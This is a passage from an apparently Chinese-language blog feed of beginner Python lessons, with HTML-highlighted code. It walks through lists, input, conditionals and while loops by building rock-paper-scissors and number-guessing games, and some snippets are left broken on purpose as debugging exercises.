keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'小红'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-in和not-in"><a href="#7-in和not-in" class="headerlink" title="7.in和not in"></a>7.in和not in</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>a <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、实现剪刀石头布游戏"><a href="#二、实现剪刀石头布游戏" class="headerlink" title="二、实现剪刀石头布游戏"></a>二、实现剪刀石头布游戏</h2><h3 id="1-计算机"><a href="#1-计算机" class="headerlink" title="1.计算机"></a>1.计算机</h3><p>计算机应该随机选择“剪刀”，“石头”，“布”</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-用户出拳"><a href="#2-用户出拳" class="headerlink" title="2.用户出拳"></a>2.用户出拳</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span>user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请出拳（石头、剪刀、布）：'</span><span class="token punctuation">)</span>  <span class="token comment"># 请用户输入选择</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span><span class="token keyword">if</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想一想，怎么加入循环，使得用户必须输入正确才能退出循环。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请出拳（石头、剪刀、布）：'</span><span class="token punctuation">)</span>  <span class="token comment"># 请用户输入选择</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有一种方法是这样。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span>user_choice <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请出拳（石头、剪刀、布）：'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为简便用户操作，能不能实现只让用户输入数字呢？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span>user_choice <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择（1石头、2剪刀、3布）：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'石头'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'剪刀'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'布'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="判断胜负"><a href="#判断胜负" class="headerlink" title="判断胜负"></a>判断胜负</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token comment">#计算机出拳</span>choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span><span class="token comment">#用户出拳</span>user_choice <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择（1石头、2剪刀、3布）：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'石头'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'剪刀'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'布'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span><span class="token comment">#判断胜负</span><span class="token keyword">if</span> user_choice <span class="token operator">==</span> computer_choice<span class="token punctuation">:</span>  <span class="token comment"># 使用if进行条件判断</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'平局！'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token punctuation">(</span>user_choice <span class="token operator">==</span> <span class="token string">'石头'</span> <span class="token keyword">and</span> computer_choice <span class="token operator">==</span> <span class="token string">'剪刀'</span><span class="token punctuation">)</span> <span class="token keyword">or</span><span class="token punctuation">(</span>user_choice <span class="token operator">==</span> <span class="token string">'剪刀'</span> <span class="token keyword">and</span> computer_choice <span class="token operator">==</span> <span class="token string">'布'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>user_choice <span class="token operator">==</span> <span class="token string">'布'</span> <span class="token keyword">and</span> computer_choice <span class="token operator">==</span> <span class="token string">'石头'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你赢了！'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输了！'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后还可以让代码更简洁一点</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token comment">#计算机出拳</span>choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span><span class="token comment">#用户出拳</span>user_choice <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择（1石头、2剪刀、3布）：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'石头'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'剪刀'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'布'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span><span class="token comment">#判断胜负</span><span class="token keyword">if</span> user_choice <span class="token operator">==</span> computer_choice<span class="token punctuation">:</span>  <span class="token comment"># 使用if进行条件判断</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'平局！'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> user_choice <span class="token operator">==</span> choice_list<span class="token punctuation">[</span>choice_list<span class="token punctuation">.</span>index<span class="token punctuation">(</span>computer_choice<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你赢了！'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输了！'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法1—猜大小</title>
      <link href="/2022/02/13/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%951%E2%80%94%E7%8C%9C%E5%A4%A7%E5%B0%8F/"/>
      <url>/2022/02/13/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%951%E2%80%94%E7%8C%9C%E5%A4%A7%E5%B0%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="1-模块的引用"><a href="#1-模块的引用" class="headerlink" title="1.模块的引用"></a>1.模块的引用</h2><h3 id="import-模块名"><a href="#import-模块名" class="headerlink" title="import 模块名"></a>import 模块名</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="import-模块名-as-别名"><a href="#import-模块名-as-别名" class="headerlink" title="import 模块名 as 别名"></a>import 模块名 as 别名</h3><p>另外，还可以给模块名取别名</p><pre class="line-numbers language-none"><code class="language-none">import random as r random_number = r.randint(1, 99)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意，内置库可以直接引用，如果是第三方库需要先安装，安装方法为：win+r，cmd，pip install 模块名。<span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><h2 id="2-print-函数"><a href="#2-print-函数" class="headerlink" title="2.print()函数"></a>2.print()函数</h2><p>print (‘’)让程序无需理解，原样输出引号中的内容。 </p><p>print()程序需要读懂括号里的内容。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>random_number<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'random_number'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果要换行打印怎么办呢？试一试下面的代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'快乐学习编程'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'每天过得很充实'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'逐渐走向人生巅峰'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''快乐学习编程,每天过得很充实,逐渐走向人生巅峰。'''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-转义字符"><a href="#3-转义字符" class="headerlink" title="3.转义字符"></a>3.转义字符</h2><p>转义字符是用来表示不能直接显示的字符，比如换行键、后退键，回车键等。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'快乐学习编程,\n每天过得很充实,\n逐渐走向人生巅峰。'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有时候也会遇到一些特殊情况，比如符号重复的问题，如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'I'</span>m student <span class="token keyword">in</span> HaiYan'<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>想一想，为什么程序会报错，应该怎么解决。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'I\'m student in HaiYan'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm student in HaiYan"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-赋值语句"><a href="#4-赋值语句" class="headerlink" title="4.赋值语句"></a>4.赋值语句</h2><p>赋值就是把左边的东西装到右边的盒子里。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">my_name<span class="token operator">=</span><span class="token string">'小王'</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>想一想，如果依次将两个东西装进同一个’盒子‘里，会怎么样。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">my_name<span class="token operator">=</span><span class="token string">'小王'</span>my_name<span class="token operator">=</span><span class="token string">'小明'</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>被多次赋值时，变量只会储存最新一次的赋值。<br>Python语言的特色，不需要类型声明，通过赋值语句，就可以定义变量，变量的类型由赋值的结果决定。<span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token number">2</span>y <span class="token operator">=</span> <span class="token number">1.0</span>z <span class="token operator">=</span> <span class="token string">'你好世界'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试一试，55，‘55’，55.0的数据类型分别是什么。</p><h2 id="5-input-函数"><a href="#5-input-函数" class="headerlink" title="5.input()函数"></a>5.input()函数</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">guess_number <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的整数:'</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>guess_number<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过刚才学习的type()函数，看一下guess_number是什么类型？</p><h2 id="6-字符串拼接"><a href="#6-字符串拼接" class="headerlink" title="6.字符串拼接"></a>6.字符串拼接</h2><p>字符串可以通过+号连接起来。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你的名字：'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你好！'</span><span class="token operator">+</span> name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>回到我们的项目中，应该怎么让这个程序更漂亮呢？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">randomNumber <span class="token operator">=</span>  <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统生成的随机数是：'</span> <span class="token operator">+</span> randomNumber<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="7-数据类型转换"><a href="#7-数据类型转换" class="headerlink" title="7.数据类型转换"></a>7.数据类型转换</h2><ul><li>str()将其他类型转换为字符串。</li><li>int()将其他类型转换为整型。</li><li>float()将其他类型转换为浮点数<br>注意：只有内容是整数或浮点数的字符串，才可以被强制转换为整数或浮点数。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'你好世界'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>另外，浮点数强制转换为整数时，会直接丢掉小数部分，不是四舍五入。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">6.8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-条件判断语句"><a href="#8-条件判断语句" class="headerlink" title="8.条件判断语句"></a>8.条件判断语句</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">score <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你这次Python考了多少分（0-100）:'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> score <span class="token operator">&gt;=</span> <span class="token number">60</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你及格了'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'唉，得加油了'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>思考，上面的程序为什么会报错，应该怎么修改。<br>如果有多个条件怎么办呢？</li></ul><p>第一种方法：用很多个if（不推荐）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">score <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你这次Python考了多少分（0-100）:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> score <span class="token operator">&gt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不错，很优秀'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token number">90</span> <span class="token operator">&gt;</span> score <span class="token operator">&gt;=</span> <span class="token number">60</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'还行吧，马马虎虎'</span><span class="token punctuation">)</span><span class="token keyword">if</span> score <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'唉，得加油了'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二种方式：（推荐）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">score <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你这次Python考了多少分（0-100）:'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> score <span class="token operator">&gt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不错，很优秀'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> score <span class="token operator">&gt;=</span> <span class="token number">60</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'还行吧，马马虎虎'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'唉，得加油了'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序是不是报错了呢？想想问题出在哪里？<br>请用刚才学习的if语句继续完成我们的项目吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="9-while循环"><a href="#9-while循环" class="headerlink" title="9.while循环"></a>9.while循环</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> a <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    password <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入密码'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> password <span class="token operator">==</span> <span class="token string">'8888'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token 